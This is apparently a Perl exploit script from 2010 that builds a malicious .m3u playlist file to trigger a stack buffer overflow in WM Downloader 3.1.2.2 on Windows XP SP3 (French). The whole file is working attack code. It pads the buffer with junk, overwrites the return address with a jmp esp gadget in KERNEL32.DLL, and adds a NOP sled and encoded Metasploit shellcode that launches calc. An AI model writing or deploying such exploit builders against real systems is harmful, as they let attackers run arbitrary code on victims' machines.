#!/usr/bin/perl
# WM Downloader 3.1.2.2  (.m3u) File WinXP Sp3(fr) Buffer Overflow stack Exploit
# Author: hadji samir       , s-dz@hotmail.fr
# Download :
# Tested : Windows XP SP3 (fr)
# DATE   : 2010-07-31
###################################################################
# thanks mo3tazz et zaitoun lakhal m3a slada naklouh ;)
#  vive  TCT 05 et DGM8
###################################################################
 
my $file= "mahboul-3lik.m3u";
my $junk= "http://"."\x42" x  17417;
my $junk1= "\x41" x  10570;
my $ret  = pack('V', 0x7C874413);# jmp esp KERNEL32.DLL
my $nops ="\x90" x 24;
 
#/*
 #* windows/exec - 223 bytes
 #* http://www.metasploit.com
 #* Encoder: x86/shikata_ga_nai
 #* EXITFUNC=thread, CMD=calc
 #*/
my $shell =
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";
 
open($FILE, ">$file");
print($FILE $junk.$ret.$nops.$shell.$junk1);
close($FILE);
print("exploit created successfully");